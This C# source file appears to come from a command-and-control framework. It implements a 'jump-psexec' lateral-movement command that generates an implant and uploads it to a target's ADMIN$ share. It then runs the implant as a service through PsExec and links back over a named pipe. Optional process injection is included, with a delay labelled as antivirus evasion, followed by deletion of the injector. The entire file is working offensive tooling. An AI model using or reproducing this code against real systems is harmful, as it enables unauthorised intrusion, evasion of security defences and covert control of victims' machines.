using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Common.AgentCommands.Composite;
using Common.CommandLine.Core;
using Common.Models;
using Common.Payload;
using Shared;

namespace Common.AgentCommands.Custom
{
    public class JumpPsExecCommandOptions : CommandOption
    {
        [Argument("target", "Target where the service will be started", 0)]
        public string Target { get; set; }
        [Option("v", "verbose", "Show details of the command execution.")]
        public bool verbose { get; set; }

        [Option("n", "pipe", "Name of the pipe used to pivot.", DefaultValue = "jmppsexec")]
        public string pipe { get; set; }

        [Option("f", "file", "FileName of payload.")]
        public string file { get; set; }

        [Option("p", "path", "Name of the folder to upload the payload.", DefaultValue = "ADMIN$")]
        public string path { get; set; }

        [Option("s", "service", "Name of service.", DefaultValue = "syssvc")]
        public string Service { get; set; }

        [Option("x86", "x86", "Generate a x86 architecture executable")]
        public bool x86 { get; set; }

        //Injection options
        [Option("i", "inject", "If the payload should be an injector")]
        public bool inject { get; set; }

        [Option("id", "injectDelay", "Delay before injection (AV evasion)", DefaultValue = 30)]
        public int injectDelay { get; set; }

        [Option("ipid", "injectProcessId", "Process Id used for injection", DefaultValue = null)]
        public int? injectProcessId { get; set; }

        [Option("ipn", "injectProcessName", "Process Name used for injection")]
        public string injectProcessName { get; set; }

        [Option("ips", "injectProcessSpawn", "Process Image path used for injection (spawn)")]
        public string injectSpawn { get; set; }

        [Option("d", "debug", "generate implant in debug mode")]
        public bool debug { get; set; }
    }

    [Command("jump-psexec", "Lateral Movement using psexec", Category = AgentCommandCategories.Composite)]
    public class JumpPsExecCommand : AgentCompositeCommand<JumpPsExecCommandOptions>
    {
        protected override async Task<bool> Run(AgentCommandContext context, JumpPsExecCommandOptions options)
        {
            var endpoint = ConnexionUrl.FromString($"pipe://*:{options.pipe}");
            var payloadOptions = new ImplantConfig()
            {
                StoreImplant = false,
                Architecture =  options.x86 ? ImplantArchitecture.x86 : ImplantArchitecture.x64,
                Endpoint = endpoint,
                IsDebug = options.debug,
                IsVerbose = options.verbose,
                Type = ImplantType.Service,
            };

            if (options.inject)
            {
                payloadOptions.IsInjected = true;
                payloadOptions.InjectionDelay = options.injectDelay;
                payloadOptions.InjectionProcessId = options.injectProcessId;
                payloadOptions.InjectionProcessName = options.injectProcessName;
                payloadOptions.InjectionProcessSpawn = options.injectSpawn;
            }

            context.WriteInfo($"[>] Generating Implant!");
            var implant = await context.GeneratePayload(payloadOptions);
            if (implant == null)
            {
                context.WriteError($"[X] Generation Failed!");
                return false;
            }
            else
                context.WriteSuccess($"[+] Generation succeed ({implant.Config.ImplantName})!");


            context.WriteInfo($"[>] Preparing Agent command flow...");

            var fileName = string.IsNullOrEmpty(options.file) ? implant.Config.ImplantName + ".exe" : options.file;
            if (Path.GetExtension(fileName).ToLower() != ".exe")
                fileName += ".exe";

            string path = "\\\\" + options.Target + '\\' + options.path + (options.path.EndsWith('\\') ? String.Empty : '\\') + fileName;

            context.Echo($"[>] Saving implant to {path}");
            context.Upload(Convert.FromBase64String(implant.Data), path);
            context.Delay(1);

            context.Echo($"[>] Executing PsExec");
            context.PsExec(options.Target, path, options.Service);

            context.Delay(2);


            if (options.inject)
            {
                context.Echo($"[>] Waiting {options.injectDelay}s to evade antivirus");
                context.Delay(options.injectDelay + 10);

                context.Echo($"R[>] emoving injector {path}");
                context.DeleteFile(path);
            }
            else
            {
                context.Echo($"[!] Don't forget to remove executable after use! : shell del {path}");
            }

            var targetEndPoint = ConnexionUrl.FromString($"pipe://{options.Target}:{options.pipe}");
            context.Echo($"[>] Linking to {targetEndPoint}");
            context.Link(targetEndPoint);

            context.Echo($"[*] Execution done!");
            context.Echo(Environment.NewLine);


            return true;
        }
    }
}
